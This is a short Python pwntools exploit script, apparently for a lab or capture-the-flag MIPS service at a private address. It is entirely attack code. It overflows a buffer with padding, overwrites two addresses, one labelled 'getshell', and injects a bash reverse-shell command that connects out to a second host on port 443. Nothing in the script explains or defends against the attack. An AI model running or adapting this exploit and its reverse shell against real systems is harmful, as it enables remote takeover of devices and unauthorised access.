#!/usr/bin/python
from pwn import *

context.arch = 'mips'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

r = remote("192.168.100.2", 8787)

P0 = b"A" * 0x14

getshell = p32(0x414106B0)

P1 = B"B" * 0x1c

overwriteAddr = p32(0x41454460)

P2 = b"A" * 0x18

dataPollution = b"bash -c 'bash -i >& /dev/tcp/192.168.100.1/443 0>&1'"

payload = P0 + getshell + P1 + overwriteAddr + P2 + dataPollution

r.sendline(payload)
r.interactive()
